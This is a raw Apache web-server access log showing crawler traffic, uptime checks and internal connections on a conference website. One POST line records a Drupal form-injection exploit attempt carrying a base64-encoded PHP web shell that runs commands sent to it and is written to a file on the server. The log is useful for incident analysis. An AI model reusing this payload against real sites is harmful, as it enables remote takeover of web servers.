www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:54:58 -0400] "GET /themes/garland/print.css?nhfa6e HTTP/1.1" 302 535 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:54:58 -0400] "GET /themes/garland/style.css?nhfa6e HTTP/1.1" 302 535 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:54:58 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 302 517 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:20:55:00 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:55:02 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 302 523 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
www.nspw.org:80 40.77.179.251 - - [01/May/2018:20:55:02 -0400] "GET /misc/drupal.js?nhfa6e HTTP/1.1" 302 515 "http://www.nspw.org/2010/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
www.nspw.org:80 ::1 - - [01/May/2018:20:55:06 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:20:55:10 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:20:55:11 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:20:55:13 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:20:55:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 40.77.167.114 - - [01/May/2018:20:57:00 -0400] "GET /papers/2008/nspw2008-bishop.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 40.77.167.148 - - [01/May/2018:20:57:01 -0400] "GET /papers/2005/nspw2005-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 40.77.167.200 - - [01/May/2018:20:57:08 -0400] "GET /papers/2010/nspw2010-bishop.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
